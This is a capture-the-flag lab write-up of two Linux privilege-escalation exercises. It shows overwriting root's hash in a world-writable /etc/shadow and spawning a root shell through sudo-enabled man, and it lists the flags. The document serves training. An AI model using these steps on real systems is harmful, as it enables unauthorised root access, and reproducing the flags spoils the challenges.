# üî¨Linux Privilege Escalation

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> üî¨ [Permissions Matter!](https://www.attackdefense.com/challengedetailsnoauth?cid=75)
>
> * Direct access to the target machine via `student` unprivileged user
> * Find specific **Linux Privilege escalation vulnerabilities manually**
> * Some files permissions are not set properly, use them to elevate privileges.

### Local Enumeration <a href="#local-enumeration" id="local-enumeration"></a>

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Misconfigured Permissions Files <a href="#misconfigured-permissions-files" id="misconfigured-permissions-files"></a>

* Look for **world writable files**
  * _Find a file that could help to elevate privileges_

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

> ‚ùó `/etc/shadow` is writable by everyone!

```bash
ls -l /etc/shadow
cat /etc/shadow

# "root" user doesn't have a password specified
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

* `/etc/shadow` stores the passwords in an encrypted format, so the `root` password need to be replaced with a hashed password

```bash
# Generate a password entry
openssl passwd -1 -salt abc password
	$1$v0N3U84r$mvHpbPX/9Zl.3YOSKjQ4p/

# Edit and paste the hashed password into the /etc/shadow file
vim /etc/shadow
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Switch to the `root` user

```bash
su
# type "password" password for "root" user
whoami

cd
ls
cat flag
```

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
**Flag:** `e62ab67ddff744d60cbb6232feaefc4d`
{% endhint %}

***

## Lab 2

> üî¨ [Editing Gone Wrong](https://www.attackdefense.com/challengedetailsnoauth?cid=80)
>
> * Direct access to the target machine via `student` unprivileged user
> * Find **misconfigured `sudo` privileges**

### Local Enumeration <a href="#local-enumeration-1" id="local-enumeration-1"></a>

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Misconfigured SUDO Privileges <a href="#misconfigured-sudo-privileges" id="misconfigured-sudo-privileges"></a>

* Find [`setuid`](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) programs

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
 
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

> üìå Useful tool - [FallOfSudo](https://github.com/CyberOne-TeamARES/FallOfSudo)

* Identify what commands the `student` user can run

```basic
sudo -l
```

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

> ‚ùó **`/usr/bin/man`** binary can be run _**with**** ****`SUDO`**** ****privileges, without providing a**** ****`root`**** ****user password**_

* This can happen on Linux systems for specific binaries that other users have to run with `SUDO` privileges. It looks _harmless_, but it can allow users to spawn bash privileged sessions, since **the specific binary can be utilized to execute specific commands**. Those commands are executed with the binary `root` privileges.

### Privilege Escalation <a href="#privilege-escalation-1" id="privilege-escalation-1"></a>

```bash
sudo man ls
```

* In the `man` scrolling page, using the **`!`** a `bash` can be spawned

```bash
!/bin/bash

# "root" bash sessions is received
```

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* Retrieve the flag with the **`root`** user

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
**Flag:** `74f5cc752947ec8a522f9c49453b8e9a`
{% endhint %}
